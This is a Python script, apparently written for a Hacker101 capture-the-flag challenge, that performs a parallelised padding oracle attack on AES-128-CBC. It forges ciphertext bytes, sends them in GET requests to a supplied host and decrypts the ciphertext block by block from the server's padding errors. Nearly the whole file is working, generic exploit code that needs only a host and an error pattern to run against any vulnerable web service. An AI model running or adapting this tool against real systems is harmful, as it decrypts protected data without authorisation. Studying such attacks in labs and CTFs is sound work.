#!/usr/bin/env python3

from base64 import b64encode as benc
from base64 import b64decode as bdec
from multiprocessing import Process, Manager
from argparse import ArgumentParser, Namespace

import time
import requests
import parmap


# global variable which will hold the length of the full ctx, including the iv.
ctx_original_length: int = -1


#
# This method prints to screen a block of recovered ptx, and stores it in a shared dictionary.
#
# This method takes in input:
#   - the recovered block of ptx (as a string)
#   - the length of the full original ctx (not just a block), including the iv
#   - the shared dictionary which will contain the full results of the decryption
#
def print_decoded_block(recovered_block: str, ctx_chunks_length: int, results: dict) -> None:
    global ctx_original_length

    if ctx_chunks_length == ctx_original_length:
        padding_length: int = ord(recovered_block[-1])
        recovered_block = recovered_block[:-padding_length] + (("\\x%X" % padding_length) * padding_length)
    
    print("Block ending at %d: decrypted: %s" % (ctx_chunks_length, recovered_block))

    results[ctx_chunks_length] = recovered_block


#
# This method takes a bytearray (the ctx) whose length is a multiple of 16, and returns a list of chunks.
#
# The chunks are created as follows:
# [
#   ctx,
#   ctx without last block,
#   ctx without last two blocks,
#   ...
#   ctx whose length is 32 bytes
# ]
#
# In particular, the shortest ctx will have a length of 32 bytes because the first 16 bytes of any ctx are the initialization vector (iv).
#
def divide_ctx_into_progressively_smaller_chunks(ctx: bytearray) -> list:
    chunks: list = []

    # We want to hard fail if the ctx has a length which is not a multiple of 16 (because the ctx must fit perfectly into an integer number of blocks).
    assert (len(ctx) % 16) == 0, "The ctx chunk must have a length which is a multiple of 16."

    # We do not create a chunk of 16 bytes only, because the first 16 bytes are the iv, and, therefore, only matter for forging purposes.
    while len(ctx) >= 32:
        chunks.append(ctx)
        ctx = ctx[:-16]

    return chunks


#
# This method decrypts and prints the last block of the ctx (the one ending with the padding).
#
# This method takes in input:
#   - a chunk of ctx (in this case the entire ctx with the iv at the begnning)
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#   - the shared dictionary which will contain the full results of the decryption
#
def decrypt_last_block(chunk: bytearray, oracle_error_message: str, url: str, results: dict) -> None:
    # We bruteforce the last byte of the penultimate block of ctx, so to recover the last byte of the last block of ptx.
    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(ctx=chunk[::], oracle_error_message=oracle_error_message, url=url)
    
    # We create a list of decrypted ptx bytes of the block we want to decrypt, and we initialize it with the byte we just decrypted (the last of the block).
    current_bruteforced_ptx_bytes: list = [ptx_val]
    
    # After bruteforcing, we increment the fake padding value by one, in order to be ready to bruteforce the previous byte.
    target_padding: int = fake_padding_val + 1

    # If the real padding is != 0x1, then we extend it to the left, skipping therefore a few bruteforcing rounds.
    # We also increment the fake padding value by 1 for each extended byte (so to keep it consistent).
    if ptx_val != 1:
        for _ in range(ptx_val - 1):
            current_bruteforced_ptx_bytes.insert(0, ptx_val)
            target_padding += 1

    # We now bruteforce the remaining bytes of the penultimate ctx block, so to recover the remaining bytes of the last ptx block.
    while len(current_bruteforced_ptx_bytes) < 16:
        # We bruteforce a byte (not the last) of the penultimate block of ctx, so to recover a byte (not the last) of the last block of ptx.
        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val =  find_byte_of_ptx_block(ctx=chunk[::], padding_value=target_padding, current_bruteforced_ptx_bytes=current_bruteforced_ptx_bytes, oracle_error_message=oracle_error_message, url=url)
        
        # We update the list of decrypted bytes by inserting the decrypted byte in position 0 (since we decrypt backwards).
        current_bruteforced_ptx_bytes.insert(0, ptx_val)
        
        # After bruteforcing, we increment the fake padding value by one, in order to be ready to bruteforce the previous byte.
        target_padding += 1

    # We put together the recovered bytes of the ptx block as a string.
    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])

    # We print and store the decrypted block of ptx.
    print_decoded_block(recovered_block=recovered_ptx, ctx_chunks_length=len(chunk), results=results)


#
# This method decrypts and prints a block of ctx which is not the last.
#
# This method takes in input:
#   - a chunk of ctx (a certain number of blocks starting from the first one with the iv at the begnning)
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#   - the shared dictionary which will contain the full results of the decryption
#
def decrypt_regular_block(chunk: bytearray, oracle_error_message: str, url:str, results: dict) -> None:
    # We bruteforce the last byte of the (fake) penultimate block of ctx, so to recover the last byte of the (fake) last block of ptx.
    old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val = find_last_byte_of_ptx_block(ctx=chunk[::], oracle_error_message=oracle_error_message, url=url)
    
    # We create a list of decrypted ptx bytes of the block we want to decrypt, and we initialize it with the byte we just decrypted (the last of the block).
    current_bruteforced_ptx_bytes: list = [ptx_val]

    # After bruteforcing, we increment the fake padding value by one, in order to be ready to bruteforce the previous byte.
    target_padding: int = fake_padding_val + 1

    # We now bruteforce the remaining bytes of the (fake) penultimate ctx block, so to recover the remaining bytes of the (fake) last ptx block.
    while len(current_bruteforced_ptx_bytes) < 16:
        # We bruteforce a byte (not the last) of the (fake) penultimate block of ctx, so to recover a byte (not the last) of the (fake) last block of ptx.
        old_ctx_val, guessed_ctx_val, fake_padding_val, ptx_val =  find_byte_of_ptx_block(ctx=chunk[::], padding_value=target_padding, current_bruteforced_ptx_bytes=current_bruteforced_ptx_bytes, oracle_error_message=oracle_error_message, url=url)
        
        # We update the list of decrypted bytes by inserting the decrypted byte in position 0 (since we decrypt backwards).
        current_bruteforced_ptx_bytes.insert(0, ptx_val)
        
        # After bruteforcing, we increment the fake padding value by one, in order to be ready to bruteforce the previous byte.
        target_padding += 1

    # We put together the recovered bytes of the ptx block as a string.
    recovered_ptx: str = "".join([chr(b) for b in current_bruteforced_ptx_bytes])

    # We print and store the decrypted block of ptx.
    print_decoded_block(recovered_block=recovered_ptx, ctx_chunks_length=len(chunk), results=results)


#
# This method detects whether the block to decrypt is the last or not, and depending on the results of the check, calls the appropriate method.
#
# This method takes in input:
#   - a chunk of ctx (a certain number of blocks starting from the first one with the iv at the begnning)
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#   - the shared dictionary which will contain the full results of the decryption
#
def decrypt_generic_block(chunk: bytearray, oracle_error_message: str, url:str, results: dict) -> None:
    # This global variable holds the length of the full ctx.
    global ctx_original_length
    
    # We decide which method to call depending on whether or not we are trying to decrypt the last block.
    # If the length of the ctx chunk is equal to the length of the full ctx, we are trying to decrypt the last block.
    if len(chunk) == ctx_original_length:
        decrypt_last_block(chunk=chunk, oracle_error_message=oracle_error_message, url=url, results=results)
    else:
        decrypt_regular_block(chunk=chunk, oracle_error_message=oracle_error_message, url=url, results=results)


#
# This method parallelizes the decryption of the blocks of ctx.
#
# This method takes in input:
#   - a list of ctx chunks, each one consisting of the previous one without the last block (of the previous one). The smallest chunk consists of iv + first block
#   - the length (in bytes) of the original ctx (iv included)
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#   - the shared dictionary which will contain the full results of the decryption
#
def parallelize_decryption(ctx_chunks: list, original_length: int, oracle_error_message: str, url: str, results: dict) -> None:
    # We store the length of the full ctx in a global variable for convenience.
    global ctx_original_length
    ctx_original_length = original_length

    parmap.map(decrypt_generic_block, ctx_chunks, oracle_error_message, url, results, pm_pbar=True, pm_parallel=True, pm_processes=len(ctx_chunks))


#
# This method parses the decrypted blocks, merges them, and prints the output, with and without padding.
#
# This method takes in input the dict containing the decrypted ptx block, each as a value whose key is the index (1-indexed) at which the block ends.
# The keys (i.e., the indexes) are used to determine the order of the blocks.
#
def reassemble_and_print_ptx(results: dict) -> None:
    # This will hold the reassembled ptx.
    ptx: str = ""

    #  We order the keys.
    keys: list = sorted(results.keys())

    # We concatenate the ptx blocks in order.
    for key in keys:
        ptx += results[key]

    # We print the reassembled ptx, padding included.
    print("Reconstructed ptx: %s" % ptx)

    # We print the reassembled ptx, padding excluded.
    print("Unpadded ptx: %s" % ptx.split("\\xA")[0]) # todo do this better.


#
# This method converts a Base64 string into a url-compliant Base64 string.
#
def b64_to_url(s: str) -> str:
    return s.replace("=", "~").replace("+", "-").replace("/", "!")


#
# This method converts a url-compliant Base64 string into a Base64 string.
#
def url_to_b64(s: str) -> str:
    return s.replace("~", "=").replace("-", "+").replace("!", "/")


#
# This method bruteforces a specific byte in the previous block of ctx so to avoid a padding error from the padding oracle.
#
# This method takes in input:
#   - a chunk of ctx (a certain number of blocks starting from the first one with the iv at the begnning)
#   - the index (relative to the chunk of ctx) of the byte to bruteforce
#   - the original byte of ctx (that will be overwritten by the brutforced one)
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#
def bruteforce_byte(ctx: bytearray, ctx_index: int, old_ctx_byte: int, oracle_error_message: str, url: str) -> int:
    # We cycle through the possible values for a byte (0-255)
    for guess in range(256):
        # For now, we do not try a guess if it is equal to the original byte.
        if guess == old_ctx_byte:
            continue

        # We substitute the ctx byte we want to bruteforce with the guess.
        ctx[ctx_index] = guess

        # We send the new ctx to the padding oracle, and look for padding errors. If we do not see the padding error, we succeeded, and we return the guess.
        if not oracle_error_message in test_guess(ctx=ctx, url=url):
            return guess

    # If we do not find a suitable candidate, it means the ptx byte value is equal to the fake padding byte value. Therefore, we return the original ctx byte.
    return old_ctx_byte


#
# This method bruteforces a byte (which is not the last) of a ctx block.
#
# This method takes in input:
#   - a chunk of ctx beginning with the iv followed by all the blocks until the one we aim to decrypt
#   - the value of the fake padding (a single int)
#   - a list of already decrypted ptx bytes of the block we aim to decrypt
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#
def find_byte_of_ptx_block(ctx: bytearray, padding_value: int, current_bruteforced_ptx_bytes: list, oracle_error_message: str, url: str) -> tuple:
    # We want to hard fail if the ctx has a length smaller than 2 blocks, as we need 2 blocks (the first of which is the iv for the first block of the real ctx).
    # We also want to hard fail if the ctx has a length which is not a multiple of 16 (because the ctx must fit perfectly into an integer number of blocks).
    assert (len(ctx) > 16) and ((len(ctx) % 16) == 0), "The ctx chunk must be at least 2-blocks long (as the first is always the iv), and must have a length which is a multiple of 16."

    # This is the index of the last byte of the penultimate block of ctx.
    ctx_final_index: int = -17

    # This is the index of the byte of the penultimate block of ctx from which we have to start the update process.
    # I.e., this is the index of the ctx byte of the penultimate block that follows the byte we want to bruteforce.
    ctx_begin_index: int = ctx_final_index - padding_value + 2

    # We have to update all the ctx values after the byte we want to bruteforce, because the fake padding has increased by 1 (both in value and size).
    for i in range(ctx_begin_index, ctx_final_index + 1):
        # The new value for the ctx byte is its old value XOR the corresponding ptx value in the next block XOR the new fake padding byte value.
        ctx[i] = ctx[i] ^ current_bruteforced_ptx_bytes[i + 16] ^ padding_value

    # This is the index of the last byte of the ctx byte we want to bruteforce.
    ctx_index: int = ctx_begin_index - 1

    # This is the original ctx byte before the bruterorcing.
    old_ctx_byte: int = ctx[ctx_index]

    # We perform the bruteforcing, and get the right guess.
    right_guess: int = bruteforce_byte(ctx=ctx, ctx_index=ctx_index, old_ctx_byte=old_ctx_byte, oracle_error_message=oracle_error_message, url=url)

    # We return a tuple:
    #   - original (non bruteforced) ctx byte
    #   - right guess (bruteforced ctx byte)
    #   - the value of a byte of the fake padding (they are all the same as per PKCS#7)
    #   - the decrypted byte of ptx
    return (old_ctx_byte, right_guess, padding_value, (old_ctx_byte ^ right_guess ^ padding_value))


#
# This method bruteforces the last byte of a ctx block.
#
# This method takes in input:
#   - a chunk of ctx beginning with the iv followed by all the blocks until the one we aim to decrypt
#   - the pattern that identifies a padding error when encountered within the server response
#   - the partial url of the oracle/website
#
def find_last_byte_of_ptx_block(ctx: bytearray, oracle_error_message: str, url: str) -> tuple:
    # We want to hard fail if the ctx has a length smaller than 2 blocks, as we need 2 blocks (the first of which is the iv for the first block of the real ctx).
    # We also want to hard fail if the ctx has a length which is not a multiple of 16 (because the ctx must fit perfectly into an integer number of blocks).
    assert (len(ctx) > 16) and ((len(ctx) % 16) == 0), "The ctx chunk must be at least 2-blocks long (as the first is always the iv), and must have a length which is a multiple of 16."

    # We fix the fake padding value to 0x1
    target_value: int = 0x1
    
    # This is the index of the last byte of the penultimate block of the ctx chunk.
    ctx_index: int = -17

    # This is the original ctx byte before the bruterorcing.
    old_ctx_byte: int = ctx[ctx_index]

    # We perform the bruteforcing, and get the right guess.
    right_guess: int = bruteforce_byte(ctx=ctx, ctx_index=ctx_index, old_ctx_byte=old_ctx_byte, oracle_error_message=oracle_error_message, url=url)

    # We return a tuple:
    #   - original (non bruteforced) ctx byte (the last byte of the penultimate block of ctx)
    #   - right guess (bruteforced ctx byte)
    #   - the value of a byte of the fake padding (they are all the same as per PKCS#7) --> in this case always 0x1
    #   - the decrypted byte of ptx (the last byte of the block we want to decrypt)
    return (old_ctx_byte, right_guess, target_value, (old_ctx_byte ^ right_guess ^ target_value))


#
# This method tests a forged ctx against the padding oracle.
#
# This method takes in input:
#   - the forged chunk of ctx to test
#   - the partial url of the oracle/website
#
def test_guess(ctx: bytearray, url: str) -> str:
    # We re-encode the ctx chunk into a url-compliant Base64 string.
    payload: str = b64_to_url(benc(ctx).decode("utf-8"))

    # We create the full url of the padding oracle by concatenating the partial url and the ctx chunk.
    full_url: str = url + "{}".format(payload)

    # We send a GET request to the padding oracle, and return the text of the response.
    return requests.get(full_url).text


#
# This method parses the command line arguments and calls the initiator of the parallel bruteforcing/decryption. 
#
def main() -> None:
    # We initialize the argument parser.
    parser: ArgumentParser = ArgumentParser()

    # This needs to be the ip address (or hostname) of the padding oracle. No scheme (e.g., http:// or https://).
    parser.add_argument("-u", "--host", required=True, type=str, metavar="host", help="The ip address (or hostname) of the padding oracle without scheme.")

    # This needs to be a user-specific ID which will be part of the padding oracle url.
    parser.add_argument("-i", "--vm-id", required=True, type=str, metavar="vm_id", help="The ID of the VM of the challenge - Hacker101 specific.")

    # This needs to be the raw ctx as a url-compliant Base64 string.
    parser.add_argument("-c", "--ctx", required=True, type=str, metavar="ctx", help="The url-ized Base64 of (iv+ctx). To url-ize means replace (=, /, +) with (~, !, -)")

    # This needs to be a pattern that, if found in the oracle's response, indicates a padding error.
    parser.add_argument("-e", "--oracle-error-pattern", required=True, metavar="oracle_error_pattern", help="The pattern to look for in the oracle response to indicate a padding error.")
    
    # We parse the cli arguments.
    args: Namespace = parser.parse_args()

    # This is the cli-parsed pattern that, if found in the oracle's response, indicates a padding error.
    oracle_error_message = args.oracle_error_pattern

    # This is the cli-parsed raw ctx as a url-compliant Base64 string.
    raw_ctx: str = args.ctx

    # This is the ctx as a bytearray (after the Base64 restoring and decoding).
    ctx: bytearray = bytearray(bdec(url_to_b64(raw_ctx)))
    
    # This is the partial url of the padding oracle.
    #
    # The final url will we like the following:
    #   http://<host-ip>/<vm-id>/?post=<iv_and_ctx_in_url_compliant_base64>
    #
    # This partial url will be like:
    #   http://<host-ip>/<vm-id>/?post=
    url: str = "http://" + args.host + "/" + args.vm_id + "/?post="
    
    # We create a list of progressively smaller ciphertexts (by removing the last 16 bytes every time).
    # The shortest ctx will have a length of 32, as the first 16 bytes are always the iv.
    chunks: list = divide_ctx_into_progressively_smaller_chunks(ctx=ctx)

    # We create a Manager, and from it a shared dictionary (which will be shared by the decryption processes) to hold the decryption results.
    manager: Manager = Manager()
    shared_dict: dict = manager.dict()

    # We start the padding oracle attack on aes-128-cbc, and parallelyze the bruteforcing/decryption effort.
    parallelize_decryption(ctx_chunks=chunks, original_length=len(ctx), oracle_error_message=oracle_error_message, url=url, results=shared_dict)

    # We reassemble and print the decrypted blocks of ptx.
    reassemble_and_print_ptx(results=shared_dict)


if __name__ == "__main__":
    # We check the timestamp.
    begin: int = time.time_ns()

    # We call the main function.
    main()

    # We check the timestamp again.
    end: int = time.time_ns()

    # We calculate the approximate time of the whole process in seconds.
    time_in_seconds: int = (end - begin) // 1000000000

    # We calculate the approximate time of the whole process in minutes and seconds.
    time_in_minutes: tuple = (time_in_seconds // 60, time_in_seconds - (time_in_seconds // 60) * 60)

    # We print the time statistics.
    print("The whole process took approximately %d seconds (%d minutes and %d seconds)." % (time_in_seconds, time_in_minutes[0], time_in_minutes[1]))
